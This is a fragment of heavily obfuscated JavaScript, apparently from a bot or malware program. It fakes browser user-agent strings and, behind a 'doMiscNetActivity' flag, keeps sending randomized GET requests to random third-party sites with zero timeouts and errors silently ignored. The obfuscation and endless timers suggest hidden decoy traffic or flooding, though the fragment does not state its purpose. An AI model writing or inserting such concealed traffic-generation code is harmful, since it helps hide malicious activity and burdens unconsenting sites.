      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xa36 * -0x2 + 0x2430 + -0x7e2 * 0x2; k < -0xef4 + -0x122e + 0x2126; k++)
    setTimeout(f, (-0x11378 + -0x1 * -0x1b8b7 + 0x4521) * k * getRandomInt(-0x1 * 0x11d7 + 0x25da + 0xc5 * -0x1a, -0x232a + 0x118 + -0x1 * -0x2215));
  setInterval(() => {
    f();
    for (let l = 0x25d1 * -0x1 + -0xa56 + 0x3027; l < -0x1c5 * 0x4 + 0xcba + -0x5a2; l++)
      setTimeout(f, (-0xe1a + -0x3 * -0x8457 + -0x948b) * l * getRandomInt(-0x1560 + -0xc13 + 0x2174, -0x1224 + 0x1931 + -0x22 * 0x35));
  }, 0x348cf * -0x21 + 0x5 * -0x9c648 + -0x3 * -0x46badd);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1a * -0x1c1 + 0x9fb + 0x51 * 0xc7) * getRandomInt(-0xb * 0x243 + 0x121 + 0x17c1, 0x1df * -0xf + -0x95e * -0x2 + -0x18f * -0x6));
}, -0x1b5a + -0x1c1a + -0x1 * -0x37d8);